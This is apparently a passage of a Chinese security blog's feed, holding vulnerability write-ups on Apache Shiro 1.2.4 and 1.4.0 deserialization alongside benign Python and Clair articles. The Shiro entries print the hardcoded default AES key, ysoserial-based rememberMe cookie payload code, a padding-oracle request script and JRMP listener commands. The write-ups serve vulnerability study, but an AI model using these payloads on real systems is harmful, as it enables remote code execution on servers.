class="keyword">in</span> self._log_line_iter(stdout):</span><br><span class="line">            self.log(log_line)</span><br><span class="line">            <span class="keyword">if</span> len(self.output) &gt; self.log_size:</span><br><span class="line">                <span class="keyword">del</span> self.output[<span class="number">0</span>]</span><br><span class="line">            self.output.append(log_line)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(self, reader)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># fix massive log(memory error)</span></span><br><span class="line">            buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> buf:</span><br><span class="line">                <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">                    lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">                lines[<span class="number">0</span>] = self.lastline + lines[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                    <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">yield</span> line</span><br><span class="line">                self.lastline = lines[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python 开发扫描器时往往会调用其他第三方工具，但是通过 &lt;code&gt;os.system()&lt;/code&gt;或者其他命令中是会有这样或那样的坑或不足，本文对这些问题进行总结并提出解决方案，并在结尾给出了一个封装好的类，能较为完美的解决Python调用第三方命令的问题。&lt;/p&gt;&lt;h1 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;首先，我可以调用任意命令，并且可以在命令执行时向输入通道（stdin）传更多输入，同时Python能实时获取输出通道（stdout）和错误通道（stderr）获程序输出，注意是获取输出，而不是单纯的将输出重定向到屏幕或文件中；&lt;/li&gt;
&lt;li&gt;我可以通过返回值，或者程序输出判断第三方程序执行是否出错，如果出错抛出异常或者进行异常处理；&lt;/li&gt;
&lt;li&gt;执行命令是最好可以设置超时时间，防止子命令假死而影响主程序；&lt;/li&gt;
&lt;li&gt;这段调用程序应该是跨平台的，毕竟Python本身就是跨平台语言。&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://anemone.top/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="安全开发" scheme="http://anemone.top/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="Python" scheme="http://anemone.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Shiro v1.2.4反序列化</title>
    <link href="http://anemone.top/vulnresearch-Shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://anemone.top/vulnresearch-Shiro1.2.4反序列化/</id>
    <published>2019-11-25T07:16:43.000Z</published>
    <updated>2020-03-21T08:21:20.482Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="触发入口"><a href="#触发入口" class="headerlink" title="触发入口"></a>触发入口</h2><p>登录点击记住密码时，有rememberMe，下次登陆时会带rememberMe的cookie，rememberMe存在反序列化问题</p><p><img src="/vulnresearch-Shiro1.2.4反序列化/1563415886850.png" alt="1563415886850"></p><h2 id="序列化入口"><a href="#序列化入口" class="headerlink" title="序列化入口"></a>序列化入口</h2><p>调试得到序列化入口和解密方法：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(AuthenticationToken, AuthenticationInfo):321</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(Subject, PrincipalCollection)</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes(L360:序列化)</span><br><span class="line">    org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(加密方法)</span><br></pre></td></tr></table></figure><a id="more"></a><p>在encrypt函数中可以看到加密方法为AES-CBC</p><p><img src="/vulnresearch-Shiro1.2.4反序列化/1563420577517.png" alt="1563420577517"> </p><h2 id="获取加密key"><a href="#获取加密key" class="headerlink" title="获取加密key"></a>获取加密key</h2><p>AbstractRememberMeManager#encrypt() 调用了getEncryptionCipherKey()方法获取加密用的key</p><p><img src="/vulnresearch-Shiro1.2.4反序列化/1565425414839.png" alt="1565425414839"></p><p>getEncryptionCipherKey返回了encryptionCipherKey，encryptionCipherKey在AbstractRememberMeManager类初始化时设置：</p><p><img src="/vulnresearch-Shiro1.2.4反序列化/1565425554398.png" alt="1565425554398"></p><p>向上找到AbstractRememberMeManager#DEFAULT_CIPHER_KEY_BYTES，密钥硬编码到了代码里：</p><p><img src="/vulnresearch-Shiro1.2.4反序列化/1565425627351.png" alt="1565425627351"></p><h2 id="分析rememberMe格式"><a href="#分析rememberMe格式" class="headerlink" title="分析rememberMe格式"></a>分析rememberMe格式</h2><p>iv和rememberMe产生接着调试</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[], byte[], boolean)</span><br></pre></td></tr></table></figure><p><img src="/vulnresearch-Shiro1.2.4反序列化/1563420885798.png" alt="1563420885798"></p><p>即rememberme=b64(IV+encrypt(serial))</p><p>因此有解密代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> enc_file, open(<span class="string">"./decrypt.bin"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> dec_file:</span><br><span class="line">    cookie = base64.b64decode(enc_file.read())</span><br><span class="line">    key  = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv=cookie[:<span class="number">16</span>]</span><br><span class="line">    serial=cookie[<span class="number">16</span>:]</span><br><span class="line">    encryptor = AES.new(key, mode, IV=iv)</span><br><span class="line">    remember_bin = encryptor.decrypt(serial)</span><br><span class="line">    dec_file.write(remember_bin)</span><br></pre></td></tr></table></figure><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><p>因此有反序列化代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'CommonsCollections4'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure><p>反序列化入口</p><p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><pre><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals    org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes); <span class="comment">//sink</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;h2 id=&quot;触发入口&quot;&gt;&lt;a href=&quot;#触发入口&quot; class=&quot;headerlink&quot; title=&quot;触发入口&quot;&gt;&lt;/a&gt;触发入口&lt;/h2&gt;&lt;p&gt;登录点击记住密码时，有rememberMe，下次登陆时会带rememberMe的cookie，rememberMe存在反序列化问题&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/vulnresearch-Shiro1.2.4反序列化/1563415886850.png&quot; alt=&quot;1563415886850&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;序列化入口&quot;&gt;&lt;a href=&quot;#序列化入口&quot; class=&quot;headerlink&quot; title=&quot;序列化入口&quot;&gt;&lt;/a&gt;序列化入口&lt;/h2&gt;&lt;p&gt;调试得到序列化入口和解密方法：&lt;/p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(AuthenticationToken, AuthenticationInfo):321&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(Subject, PrincipalCollection)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes(L360:序列化)			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(加密方法)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Web安全" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Shiro" scheme="http://anemone.top/tags/Shiro/"/>
    
      <category term="反序列化" scheme="http://anemone.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Java" scheme="http://anemone.top/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Shiro v1.4.0反序列化</title>
    <link href="http://anemone.top/vulnresearch-Shrio1.4.0PaddingOracle%E5%AF%BC%E8%87%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://anemone.top/vulnresearch-Shrio1.4.0PaddingOracle导致反序列化/</id>
    <published>2019-11-25T07:15:43.000Z</published>
    <updated>2020-03-21T08:11:52.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>shiro1.2.5后秘钥不再硬编码，但是采用CBC加密会产生padding  oracle攻击，又因为java序列化结构体后可以加垃圾字符，所以攻击能够成功</p><h1 id="解密时的调用链"><a href="#解密时的调用链" class="headerlink" title="解密时的调用链"></a>解密时的调用链</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals // 不论哪个异常都会返回null，上层302跳转</span><br><span class="line">  org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</span><br><span class="line">    org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])</span><br><span class="line">      org.apache.shiro.crypto.JcaCipherService#decrypt(byte[] encrypted, byte[] key, byte[] iv)</span><br><span class="line">        org.apache.shiro.crypto.JcaCipherService#crypt(byte[] encrypted, byte[] key, byte[] iv, int MODE):</span><br><span class="line">          org.apache.shiro.crypto.JcaCipherService#crypt(javax.crypto.Cipher, byte[] encrypted):459 //throw Unable to execute 'doFinal' with cipher instance</span><br><span class="line">            javax.crypto.Cipher#doFinal(byte[] encrypted)  //this=(key+iv+mode) // jce.jar包 调试直接在这下断点</span><br><span class="line">              com.sun.crypto.provider.AESCipher#engineDoFinal(byte[] encrypted, startIdx, len)</span><br><span class="line">                com.sun.crypto.provider.CipherCore#doFinal(byte[] encrypted, startIdx, len)</span><br><span class="line">                  com.sun.crypto.provider.CipherCore#fillOutputBuffer(encrypted, startIdx, iv, startIdx, len, encrypted)</span><br><span class="line">                    com.sun.crypto.provider.CipherCore#unpad(len, decrypted)</span><br><span class="line">                      com.sun.crypto.provider.PKCS5Padding#unpad(decrypted, startIdx, len)  // throw BadPaddingException</span><br><span class="line">  org.apache.shiro.mgt.AbstractRememberMeManager#deserialize(serialized)</span><br><span class="line">    org.apache.shiro.io.DefaultSerializer#deserialize(serialized) // invalid stream header</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="Padding-Oracle-原因"><a href="#Padding-Oracle-原因" class="headerlink" title="Padding  Oracle 原因"></a>Padding  Oracle 原因</h1><p>理论上即使padding通过，反序列化也会失败，统一报错并返回null。因为不管是Padding正确或是错误返回结果无区别，因此无法造成PaddingOracle。</p><p>但是注意到，<strong>若当字符串A可以成功反序列化，B为垃圾字符串，则A+B可以成功反序列化</strong>（这与java原生序列化数据结构有关），因此去掉SESSIONID后，在正常的rememberMe后面添加block，即rememberMe=prefix+iv+secret：</p><p><img src="/vulnresearch-Shrio1.4.0PaddingOracle导致反序列化/padding.png" alt="padding"></p><p>请求后：</p><ul><li><p>如果BadPaddingException</p><ul><li>返回重新登录（setCookie: DeleteMe=true）</li></ul></li><li><p>如果Padding合法</p><ul><li>与正常登录表现一样</li></ul></li></ul><p>因此存在Oracle：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shiro_decode</span><span class="params">(secret: bytearray, iv: bytearray)</span> -&gt; int:</span></span><br><span class="line">    burp0_url = <span class="string">"http://localhost.com:8000/"</span></span><br><span class="line">    <span class="comment">#合法的rememberMe</span></span><br><span class="line">    prefix = base64.b64decode(<span class="string">"wM0qqzm72M+..."</span>)</span><br><span class="line"></span><br><span class="line">    base64_ciphertext = base64.b64encode(prefix+iv+secret).decode()</span><br><span class="line">    burp0_cookies = &#123;<span class="string">"rememberMe"</span>: base64_ciphertext&#125;</span><br><span class="line">    logging.info(<span class="string">"Sending secret=&#123;&#125;"</span>.format(secret))</span><br><span class="line">    res=requests.get(burp0_url, cookies=burp0_cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    set_cookie=res.headers.get(<span class="string">'set-cookie'</span>,<span class="string">''</span>)</span><br><span class="line">    logging.info(<span class="string">"Headers &#123;&#125;."</span>.format(set_cookie))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'rememberMe'</span> <span class="keyword">in</span> set_cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="JRMP攻击步骤"><a href="#JRMP攻击步骤" class="headerlink" title="JRMP攻击步骤"></a>JRMP攻击步骤</h1><ol><li><p>自己服务器起一个JRMPListener：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsCollections2 <span class="string">'calc'</span></span><br></pre></td></tr></table></figure></li><li><p>用padding生成密文，padding oracle脚本在<a href="https://github.com/Anemone95/padding-oracle-attack" target="_blank" rel="noopener">https://github.com/Anemone95/padding-oracle-attack</a></p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shiro_padding_oracle</span><span class="params">()</span>:</span></span><br><span class="line">    fake_plain=get_deserialized(<span class="string">"127.0.0.1:1234"</span>)</span><br><span class="line">    print(len(fake_plain))</span><br><span class="line">    iv, secret=encrypt(fake_plain, <span class="number">16</span>)</span><br><span class="line">    print(base64.b64encode(iv+secret))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_deserialized</span><span class="params">(host)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>,</span><br><span class="line">                              <span class="string">'-jar'</span>,</span><br><span class="line">                              <span class="string">'ysoserial.jar'</span>,</span><br><span class="line">                              <span class="string">'JRMPClient'</span>,</span><br><span class="line">                              host],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br></pre></td></tr></table></figure></li><li><p>返回结果：</p> <figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2019</span>-<span class="number">08</span>-<span class="number">07</span> <span class="number">17</span>:<span class="number">39</span>:<span class="number">10</span>,<span class="number">651</span> : INFO : poc<span class="variable">.py</span> : encrypt : IV: <span class="number">0</span>f154f913ce794ad2c65ce9c0c2bd19e, Secret: d363571634286d600279fdf124069a65695e1c3338da0d27131b6c9362bece8f10796c1163d0c067713a46063ee25313325cb58eedd5cb62be1ed495bd1550974f008df6486bfd0fe24e5a04bd3fb090f036451821303e6b808034e4392c1225bf5a7a5e3eb9fab7b055c809330f83db7a561a2ac4e95f8d16c9bfbe66b35774c16cbb3089e54b63c4d8f86b490dca0f8f1ac46cd4ab2b41645b1909b7fdb4a5c21f15033b6f7dc30b3308ee8f2fb5bf220f38355bbfed92be9431a4127034a967f507f8fc582a00dae5c013263507cb54b08694cba7ef998145147ce8419cc5a665462c2d3b91fb259629d2289e31e9d3c407a02d382df90ac62a7c1b35b08767cbe3541a74987280dff8a541aa20b700000000000000000000000000000000</span><br><span class="line">b'DxVPkTznlK0sZc6cDCvRntNjVxY0KG1gAnn98SQGmmVpXhwzONoNJxMbbJNivs6PEHlsEWPQwGdxOkYGPuJTEzJctY7t1ctivh7Ulb0VUJdPAI32SGv9D+JOWgS9P7CQ8DZFGCEwPmuAgDTkOSwSJb9ael4+ufq3sFXICTMPg9t6VhoqxOlfjRbJv75ms1d0wWy7MInlS2PE2PhrSQ3KD48axGzUqytBZFsZCbf9tKXCHxUDO299wwszCO6PL7W/Ig84NVu/<span class="number">7</span>ZK+lDGkEnA0qWf1B/j8WCoA2uXAEyY1B8tUsIaUy6fvmYFFFHzoQZzFpmVGLC07kfsllinSKJ4x6dPEB6AtOC35CsYqfBs1sIdny+NUGnSYcoDf+KVBqiC3AAAAAAAAAAAAAAAAAAAAAA=='</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;shiro1.2.5后秘钥不再硬编码，但是采用CBC加密会产生padding  oracle攻击，又因为java序列化结构体后可以加垃圾字符，所以攻击能够成功&lt;/p&gt;&lt;h1 id=&quot;解密时的调用链&quot;&gt;&lt;a href=&quot;#解密时的调用链&quot; class=&quot;headerlink&quot; title=&quot;解密时的调用链&quot;&gt;&lt;/a&gt;解密时的调用链&lt;/h1&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals // 不论哪个异常都会返回null，上层302跳转&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  org.apache.shiro.mgt.AbstractRememberMeManager#decrypt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      org.apache.shiro.crypto.JcaCipherService#decrypt(byte[] encrypted, byte[] key, byte[] iv)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        org.apache.shiro.crypto.JcaCipherService#crypt(byte[] encrypted, byte[] key, byte[] iv, int MODE):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          org.apache.shiro.crypto.JcaCipherService#crypt(javax.crypto.Cipher, byte[] encrypted):459 //throw Unable to execute &#39;doFinal&#39; with cipher instance&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            javax.crypto.Cipher#doFinal(byte[] encrypted)  //this=(key+iv+mode) // jce.jar包 调试直接在这下断点&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              com.sun.crypto.provider.AESCipher#engineDoFinal(byte[] encrypted, startIdx, len)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                com.sun.crypto.provider.CipherCore#doFinal(byte[] encrypted, startIdx, len)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  com.sun.crypto.provider.CipherCore#fillOutputBuffer(encrypted, startIdx, iv, startIdx, len, encrypted)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    com.sun.crypto.provider.CipherCore#unpad(len, decrypted)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      com.sun.crypto.provider.PKCS5Padding#unpad(decrypted, startIdx, len)  // throw BadPaddingException&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  org.apache.shiro.mgt.AbstractRememberMeManager#deserialize(serialized)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    org.apache.shiro.io.DefaultSerializer#deserialize(serialized) // invalid stream header&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Web安全" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Shiro" scheme="http://anemone.top/tags/Shiro/"/>
    
      <category term="反序列化" scheme="http://anemone.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Java" scheme="http://anemone.top/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Clair初探</title>
    <link href="http://anemone.top/container-Clair%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/container-Clair初探/</id>
    <published>2019-11-16T08:12:49.000Z</published>
    <updated>2019-11-24T07:58:54.077Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Clair简介"><a href="#Clair简介" class="headerlink" title="Clair简介"></a>Clair简介</h1><p>clair是CoreOS公司开源的一套针对容器安全性检测工具，主要用于发掘容器中使用的组件是否存在安全性问题。</p><p>GitHub项目地址： <a href="https://github.com/quay/clair" target="_blank" rel="noopener">https://github.com/quay/clair</a> </p><h1 id="Clair-Framework"><a href="#Clair-Framework" class="headerlink" title="Clair Framework"></a>Clair Framework</h1><h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><ul><li>Ancestry——表示容器</li><li>Feature——容器中任何具有脆弱性的实体，如软件包和文件</li><li>Feature Namespace——Feature所在的上下文，如操作系统和编程语言</li><li>Vulnerability Source——Clair中用来跟踪上有漏洞数据库（如CVE）的组件</li><li>Vulnerability Metadata Source——漏洞元数据，用来关联上游漏洞数据和Clair数据库</li></ul><a id="more"></a><h2 id="Detector"><a href="#Detector" class="headerlink" title="Detector"></a>Detector</h2><ul><li>DataDector： 用来检测容器类型（除了docker还有appc）</li><li>FeaturesDector：发掘容器中使用的组件</li><li>NamespaceDetector：用来命名空间中存在的安全性问题</li></ul><h2 id="Updaters-amp-Notifiers"><a href="#Updaters-amp-Notifiers" class="headerlink" title="Updaters &amp; Notifiers"></a>Updaters &amp; Notifiers</h2><ul><li>updaters：用来从漏洞库里获取漏洞信息</li><li>Notifier：用来通知用户安全问题，同时支持webhook</li></ul><h2 id="Datastore"><a href="#Datastore" class="headerlink" title="Datastore"></a>Datastore</h2><p>主要用来存储漏洞数据</p><h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><h2 id="安装（Server）"><a href="#安装（Server）" class="headerlink" title="安装（Server）"></a>安装（Server）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir clair_config</span><br><span class="line">curl -L https://raw.githubusercontent.com/coreos/clair/master/config.yaml.sample -o <span class="variable">$PWD</span>/clair_config/config.yaml</span><br><span class="line">docker run -d -e POSTGRES_PASSWORD=<span class="string">""</span> -p 5432:5432 postgres:9.6</span><br><span class="line">docker run --net=host 